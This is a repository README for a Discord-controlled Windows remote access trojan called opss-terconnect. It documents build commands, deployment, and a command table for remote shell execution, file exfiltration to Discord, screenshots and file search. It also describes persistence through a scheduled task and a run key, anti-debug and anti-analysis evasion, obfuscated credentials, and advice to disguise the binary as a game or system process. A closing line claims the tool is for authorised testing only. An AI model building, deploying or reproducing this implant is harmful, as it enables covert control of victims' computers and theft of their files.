# opss-terconnect

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

Discord bot C2 — Nuitka-compiled Windows binary for remote command execution, file download, screenshot capture, and file search from a Discord control channel. Persistent via scheduled task + registry run key.

## Screenshots

![Connected](images/connected.png)
![Ping](images/ping.png)
![Exec](images/exec.png)
![Download](images/download.png)

## Overview

One binary per target machine. Each target runs its own Discord bot (HTTP API client) with its own token. The binary polls the Discord REST API for commands in a control channel; the matching target executes and sends results back via HTTP. On first run, the binary installs itself as a scheduled task (runs at user logon) and adds a registry run key — so it survives reboots.



```bash
# Build per target
python token_gen.py "MT...bot-token..." "channel_id" "admin_id"
# → paste XOR-obfuscated bytes into VALORANT.py

pip install -r requirements.txt
python -m nuitka --onefile --windows-console-mode-disable \
    --windows-icon-from-ico=valorant.ico VALORANT.py
```

No Discord gateway WebSocket connection. No `discord.py` dependency. The binary uses only Python stdlib (`urllib`) for HTTP — no external runtime deps in the compiled output.

## Build

**One build per target. One token per target. Do not share binaries.**

```bash
# 1. Generate XOR-obfuscated config (on build machine, with real token)
python token_gen.py "MT...bot-token..." "channel_id" "admin_id"
# → paste the output into VALORANT.py, replacing the placeholder lists

# 2. Compile
pip install -r requirements.txt
python -m nuitka --onefile --windows-console-mode=disable \
    --windows-icon-from-ico=valorant.ico \
    --lto \
    --python-flag=no_site \
    --python-flag=no_user_site \
    --assume-yes-for-downloads \
    VALORANT.py

# 3. (Optional) Strip debug symbols
#    Linux:  strip VALORANT.exe
#    Windows: editbin /STS or similar

# 4. Rename to a generic name (e.g. svchost_update.exe)
#    Process name in Task Manager = filename. Pick something boring.
```

The token, channel ID, and admin ID are XOR-obfuscated in source — never in plaintext. The compiled binary does not reveal them via `strings` or static analysis.

## Deploy

Copy the `.exe` to the target machine. Run it. On first run the binary:
1. Runs anti-analysis defenses (exits silently if debugger/analysis tool detected)
2. Installs persistence (scheduled task at user logon + registry run key)
3. Announces itself in the control channel
4. Starts polling for commands

To stop temporarily: end the process in Task Manager. Persistence remains — the binary will restart at next logon.

## Commands

|| Command | Description |
|---------|-------------|
|| `!exec <name> <cmd>` | Run a shell command on the target matching `<name>` (hostname, uppercase) |
|| `!download <name> <path>` | Upload a file from the target to the control channel (max 25 MB) |
|| `!pingall` | Target responds with a presence check |
|| `!screenshot` | Capture the primary screen and upload as BMP file |
|| `!filesearch <pattern> [path]` | Search for files matching `<pattern>` (e.g. `*.docx`) under `[path]` (default: C:\\). Returns up to 100 results. |
|| `!uninstall` | Remove persistence (scheduled task + registry run key). Binary remains on disk. |
|| `!selfdestruct` | Remove persistence and schedule binary deletion on next reboot. Binary exits immediately. |

## Security

### Built-in

- **XOR-obfuscated credentials** — token, channel ID, admin ID as XOR byte arrays. Token is split into multiple arrays and the decode key is derived at runtime from separate constants. No plaintext in source or binary. Defends against `strings` and static disassembly.
- **Anti-debug** — `IsDebuggerPresent` + `CheckRemoteDebuggerPresent` checked at startup AND before each token decode. Silent exit if attached.
- **Anti-tool scan** — process list checked for ProcmDump, Process Hacker, x64dbg, Cheat Engine, WinDbg, IDA, dnSpy, and others. Silent exit if found.
- **Per-request token decode** — token decoded into a short-lived buffer for each HTTP call, converted to string for the auth header, then wiped (3-pass). Plaintext token lifetime is bounded to the duration of each HTTP call, not the life of the process.
- **CreateProcess via ctypes** — commands run with `CREATE_NO_WINDOW` flag, no visible console window.
- **Polling jitter** — 4–6 second random sleep between polls instead of fixed 5-second interval, to avoid a machine-identifiable pattern.
- **Persistence** — scheduled task (runs at user logon as SYSTEM) + HKCU Run key. Both use a generic task name chosen at build time. Survives reboots.

### Limitations

- **Memory dump:** The token must be a string in memory for HTTP auth (`Authorization: Bot ***`). A dump taken while a request is in flight finds it. XOR storage defends the binary on disk only.
- **XOR key in repo:** The key constants and obfuscated bytes are committed. A reverse engineer who decodes the logic recovers the values. This stops casual analysis, not a determined debugger.
- **Anti-debug bypassable:** Checks can be circumvented by renaming tools, patching the binary, or dumping externally.
- **Polling latency:** 4–6 second jitter interval vs real-time gateway. Acceptable for C2 command execution, not instant.
- **Persistence visibility:** Scheduled tasks and registry run keys are visible to anyone inspecting the system. The task name is generic but not hidden.
- **Self-destruct delay:** Binary deletion via MoveFileEx is deferred to next reboot. The file remains on disk until then.
- **Screenshot size:** BMP format, no compression. Large screens produce multi-MB files — within Discord's 25MB limit but not minimal.

## Cleanup

End the executable in Task Manager. For full removal, send `!uninstall` in the control channel to remove persistence (the binary stays on disk), or send `!selfdestruct` to remove persistence and schedule the binary for deletion on next reboot.

To manually remove persistence: delete the scheduled task named `WindowsSecurityCheck` via Task Scheduler, and remove the corresponding entry from `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.

## Repository structure

```
opss-terconnect/
├── VALORANT.py          # Main bot (XOR config, anti-analysis, HTTP polling, persistence, commands)
├── defenses.py          # Anti-debug / anti-dump helpers
├── persistence.py       # Persistence, screenshot, file search, self-destruct
├── token_gen.py         # CLI tool: generate XOR-obfuscated config
├── requirements.txt     # nuitka (build tool only)
├── .gitignore
├── README.md
├── images/
│   ├── connected.png
│   ├── ping.png
│   ├── exec.png
│   ├── download.png
│   └── pwned.png
└── valorant.ico
```

## License

MIT — see [LICENSE](LICENSE).

---

## ⚠️ Authorised testing and learning only

This tool is for authorised security testing and learning. Do not use against systems you do not have permission to test.


